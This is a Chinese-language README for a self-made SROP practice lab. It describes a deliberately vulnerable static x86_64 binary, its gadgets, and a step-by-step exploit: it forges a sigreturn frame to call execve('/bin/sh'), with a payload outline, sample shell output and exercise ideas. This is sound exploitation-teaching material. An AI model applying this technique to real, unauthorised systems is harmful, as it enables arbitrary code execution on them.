# lab_srop_baby —— 自造 SROP 靶场（L1）

> **这是自造实验，不是真实赛题。** 目的：在没有任何外部 libc / 附件依赖的前提下，
> 提供一个"只能靠 SROP 解"的最小靶子，用来吃透 `rt_sigreturn` 的机制。
> 真实赛题归档见仓库其他模式目录；本目录属于 `labs/`（self-made）。

---

## 1. 题目行为

```text
$ ./chal
name:        <- read(0, 0x403010, 0x100)   把名字写进 bss
exploit:     <- read(0, rsp, 0x400)        栈溢出
             ret                           返回到栈上的地址
```

保护：

| 项 | 值 |
| --- | --- |
| 架构 | x86_64，静态（无 libc） |
| PIE | 无（`ET_EXEC`，基址 `0x400000`） |
| NX | **开启**（`PT_GNU_STACK = RW`） |
| canary | 无 |
| RELRO | 无（没有 GOT） |

可用 gadget（`nm chal` 可查）：

```text
0x401065  gadget_syscall_ret    syscall; ret
0x401068  gadget_pop_rax_ret    pop rax; ret
0x403010  bss_buf               0x100 字节可写
```

---

## 2. 为什么"只能 SROP"

- 栈不可执行 → 不能 ret2shellcode。
- 没有 libc、没有 `pop rdi`/`pop rsi`/`pop rdx` → 传不出 `execve(path, argv, envp)` 三个参数。
- 但程序里有 `syscall; ret` 和 `pop rax; ret`：
  `pop rax = 15` 后执行 `syscall` 就是 **`rt_sigreturn`**，
  内核会把当前栈当成 `sigcontext` 还原所有寄存器（包括 `rip`、`rsp`）——
  相当于用 248 字节的数据一次性设置全部寄存器。

---

## 3. 利用步骤

```text
1) name 阶段：送 "/bin/sh\0"  → 落在 0x403010（地址已知，No PIE）
2) exploit 阶段：
     payload = p64(pop_rax) + p64(15) + p64(syscall_ret) + bytes(frame)
     frame.rax = 59           # execve
     frame.rdi = 0x403010     # "/bin/sh"
     frame.rsi = 0
     frame.rdx = 0
     frame.rip = syscall_ret  # sigreturn 之后从这里继续
     frame.rsp = 0x403090
3) ret -> pop_rax -> rax=15 -> syscall -> rt_sigreturn -> execve("/bin/sh")
```

实测：

```text
[*] payload: 272 bytes
__PWNED__
uid=1000(yfhd5) gid=1000(yfhd5) ...
```

---

## 4. 复现

```bash
cd '/home/yfhd5/Pwn Writeups/labs/lab_srop_baby'
make                                   # as + ld，无 libc 依赖
python exp.py                          # 需要 pwntools（仓库 .venv）
```

`make` 只用 binutils：

```text
as -o chal.o src/chal.S
ld -o chal chal.o
```

---

## 5. 源码要点（`src/chal.S`）

1. 三次 `syscall` 完成 `write("name: ")` / `read(bss)` / `write("exploit: ")` / `read(rsp)`。
2. 最后一次 `read` 的目标是 **`rsp`**，紧随其后的 `ret` 直接吃栈上的返回地址。
3. 末尾 `.section .note.GNU-stack,"",@progbits` 是**必须**的：
   不写这一行 `ld` 不生成 `PT_GNU_STACK`，内核对老式无该段的程序默认给可执行栈，
   题目就会退化成 ret2shellcode，SROP 的意义就没了。

---

## 6. 可以继续加的练习（L2 / L3 方向）

| 变体 | 加什么 | 学到什么 |
| --- | --- | --- |
| L2 | fork + canary + 一次 leak | 多进程下 canary 复用、partial overwrite |
| L3 | 动态链接 + `read` 溢出 + 无 `system@plt` | ret2dlresolve（伪造 `Elf64_Rela`/`Sym`/`strtab`） |
| L4 | 只给 `leave; ret` + 可控 saved rbp | 栈迁移 + SROP 组合 |
| L5 | glibc 2.4x 堆题 | tcache 双链表 / `_IO_FILE` FSOP（注意现代 glibc 已无 `__free_hook`） |
